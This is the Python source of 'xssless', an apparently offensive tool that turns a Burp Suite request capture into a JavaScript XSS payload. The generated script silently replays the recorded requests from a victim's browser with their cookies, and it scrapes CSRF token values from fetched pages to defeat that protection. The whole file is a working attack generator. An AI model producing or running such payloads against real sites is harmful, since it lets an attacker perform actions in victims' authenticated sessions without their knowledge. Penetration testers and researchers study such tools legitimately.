#!/usr/bin/env python
import sys
from bs4 import BeautifulSoup
import base64
import json
import os

def get_burp_list(filename):
    if not os.path.exists(filename):
        return []

    with open(filename) as f:
            filecontents = f.read()

    archive = BeautifulSoup(filecontents, "xml")

    requestList = []
    item = archive.find_all('item')

    for item in archive.find_all('item'):
        tmpDict = {}
        tmpDict['request'] = base64.b64decode(item.request.string)
        tmpDict['response'] = base64.b64decode(item.response.string)
        tmpDict['url'] = item.url.string
        requestList.append(tmpDict)
        del tmpDict
    
    return requestList

# Get a list of headers for request/response
def parse_request(input_var, url):
    
    # Set flags for later interpretation (ie, POST is actually JSON data, etc)
    flags = []

    # Split request into headers/body and parse header into list
    request_parts = input_var.split("\r\n\r\n")
    header_data = request_parts[0]
    body_data = request_parts[1]
    header_lines = header_data.split("\r\n")
    header_lines = filter(None, header_lines) # Filter any blank lines

    # Pop off the first one because GET / HTTP 1.1
    rtype_line = header_lines.pop(0)
    rtypeList = rtype_line.split(" ")

    # Create a list of the headers:
    # headerList[0]['Key'] = "Cookies"
    # headerList[0]['Value'] = "PHPSESSID=5fffa5e6e11ddcf3c722533c14adc310"
    headerList = []
    host = ""
    for line in header_lines:
        tmpList = line.split(": ")
        headerDict = {}
        headerDict['Key'] = tmpList[0]
        headerDict['Value'] = tmpList[1]

        # Grab important values
        if headerDict['Key'].lower() == "host":
            host = headerDict['Value']

        headerList.append(headerDict)
        del headerDict
        del tmpList

    # Create a list of body values (check for JSON, etc)
    # bodyList[0]['Key'] = "username"
    # bodyList[0]['Value'] = "mandatory"
    bodyList = []
    body_var_List = body_data.split("&")
    body_var_List = filter(None, body_var_List)
    for item in body_var_List:
        tmpList = item.split("=")
        bodyDict = {}
        bodyDict['Key'] = tmpList[0]
        bodyDict['Value'] = tmpList[1]
        bodyList.append(bodyDict)
        del tmpList
        del bodyDict
        
    # Returned dict, chocked full of useful information formatted nicely for your convienience!
    returnDict = {}
    returnDict['method'] = rtypeList[0] # Method being used (POST, GET, PUT, DELETE, HEAD)
    returnDict['path'] = rtypeList[1] # Path for request
    returnDict['host'] = host 
    returnDict['http_version'] = rtypeList[2] # Version of HTTP reported
    returnDict['headerList'] = headerList # List of header key/values
    returnDict['bodyList'] = bodyList # List of body key/values
    returnDict['header_text'] = header_data # Raw text of HTTP headers
    returnDict['body_text'] = body_data # Raw text of HTTP body
    returnDict['flags'] = flags # Special flags
    returnDict['url'] = url

    return returnDict

# Parse response
def parse_response(input_var, url):
    # Set flags for later interpretation (ie, POST is actually JSON data, etc)
    flags = []

    # Split request into headers/body and parse header into list
    request_parts = input_var.split("\r\n\r\n")
    header_data = request_parts[0]
    body_data = request_parts[1]
    header_lines = header_data.split("\r\n")
    header_lines = filter(None, header_lines) # Filter any blank lines

    # Pop off the first one because HTTP/1.1 200 OK
    rtype_line = header_lines.pop(0)
    rtypeList = rtype_line.split(" ")

    # Create a list of the headers:
    # headerList[0]['Key'] = "Cookies"
    # headerList[0]['Value'] = "PHPSESSID=5fffa5e6e11ddcf3c722533c14adc310"
    headerList = []
    content_type = ""
    for line in header_lines:
        tmpList = line.split(": ")
        headerDict = {}
        headerDict['Key'] = tmpList[0]
        headerDict['Value'] = tmpList[1]

        if headerDict['Key'].lower() == "Content-Type".lower():
            content_type = headerDict['Value']

        headerList.append(headerDict)
        del headerDict
        del tmpList

    # Returned dict, chocked full of useful information formatted nicely for your convienience!
    returnDict = {}
    returnDict['status'] = rtypeList[1] # Method being used (POST, GET, PUT, DELETE, HEAD)
    returnDict['statusmsg'] = rtypeList[2] # Path for request
    returnDict['http_version'] = rtypeList[0] # Version of HTTP reported
    returnDict['headerList'] = headerList # List of header key/values
    returnDict['header_text'] = header_data # Raw text of HTTP headers
    returnDict['body_text'] = body_data # Raw text of HTTP body
    returnDict['content_type'] = content_type # Text of the content type
    returnDict['flags'] = flags # Special flags
    returnDict['url'] = url

    return returnDict

def xss_gen(requestList, settingsDict):

    payload = """
<script type="text/javascript">
    var funcNum = 0;
    function doRequest(url, method, body)
    {
        var http = window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject("Microsoft.XMLHTTP");
        http.withCredentials = true;
        http.onreadystatechange = function() {
            if (this.readyState == 4) {
                var response = http.responseText; 
                var d = document.implementation.createHTMLDocument("");
                d.documentElement.innerHTML = response;
                requestDoc = d;
                funcNum++;
                try {
                    window['r' + funcNum](requestDoc);
                } catch (error) {}
            }    
        };
        if(method == "POST")
        {
            http.open('POST', url, true);
            http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
            http.setRequestHeader('Content-length', body.length);
            http.setRequestHeader('Connection', 'close');
            http.send(body);
        } else if (method == "GET") {
            http.open('GET', url, true); 
            http.send();
        } else if (method == "HEAD") {
            http.open('HEAD', url, true); 
            http.send();
        }
    }
    r0();
"""

    # Function chaining is implemented to avoid the issue of freezing the user's browser during 'secret' JS activity
    # Each request is done as a function that one requestion completion, calls the next function.
    # The result is an unclobered browser and no race conditions! (Because cookies may need to be set, etc)

    i = 0
    for conv in requestList:
        requestDict = parse_request(conv['request'], conv['url'])
        responseDict = parse_response(conv['response'], conv['url'])

        payload += "    function r" + str(i) + "(requestDoc){\n"

        if requestDict['method'].lower() == "post":
            postString = ""
            for pair in requestDict['bodyList']:
                if pair['Key'] in settingsDict['parseList']:
                    postString += pair['Key'] + "=" + "' + encodeURIComponent(requestDoc.getElementsByName('" + pair['Key'] + "')[0].value) + '&"
                else:
                    postString += pair['Key'] + "=" + pair['Value'] + "&"

            postString = postString[:-1] # Remove last &

            payload += "        doRequest('" + requestDict['url'] + "', 'POST', '" + postString + "');\n"
        elif requestDict['method'].lower() == "get":
            payload += "        doRequest('" + requestDict['url'] + "', 'GET', '');\n"
        elif requestDict['method'].lower() == "head":
            payload += "        doRequest('" + requestDict['url'] + "', 'HEAD', '');\n"
            pass

        payload += "    }\n"
        payload += "\n"
        i += 1

    payload += "</script>"
    return payload

logo = """
                      .__                        
___  ___  ______ _____|  |   ____   ______ ______
\  \/  / /  ___//  ___/  | _/ __ \ /  ___//  ___/
 >    <  \___ \ \___ \|  |_\  ___/ \___ \ \___ \ 
/__/\_ \/____  >____  >____/\___  >____  >____  >
      \/     \/     \/          \/     \/     \/ 
               The automatic XSS payload generator
                     By mandatory (Matthew Bryant)
"""

helpmenu = """
Example: """ + sys.argv[0] + """ [ OPTION(S) ] [ BURP FILE ]

-h               Show's this help menu
-p=PARSEFILE     Parse list - input file containing a list of CSRF token names to be automatically parsed and set with JS.
-s               Don't display the xssless logo

"""
if len(sys.argv) < 2:
    print logo
    print helpmenu
else:
    # settingsDict will contain code generation settings, such as waiting for each request to complete, etc.
    settingsDict = {}

    showlogo = True

    for option in sys.argv[1:]:
        if option == "-h":
            print logo
            print helpmenu
            sys.exit()
        if option == "-s":
            showlogo = False
        if "-p=" in option:
            parsefile = option.replace("-p=", "")
            if os.path.isfile(parsefile):
               tmpList = open(parsefile).readlines()
               for key,value in enumerate(tmpList):
                   tmpList[key] = value.replace("\n", "")
               if len(tmpList):
                   settingsDict['parseList'] = tmpList
                   del tmpList
            else:
                print "Error, parse list not found!"

    if os.path.exists(sys.argv[-1]):
        inputfile = sys.argv[-1]
    else:
        inputfile = ""

    if showlogo:
        print logo

    if inputfile:
        requestList = get_burp_list(inputfile)
        print xss_gen(requestList, settingsDict)
    else:
        print "Error while processing Burp export, please ensure the file exists!"
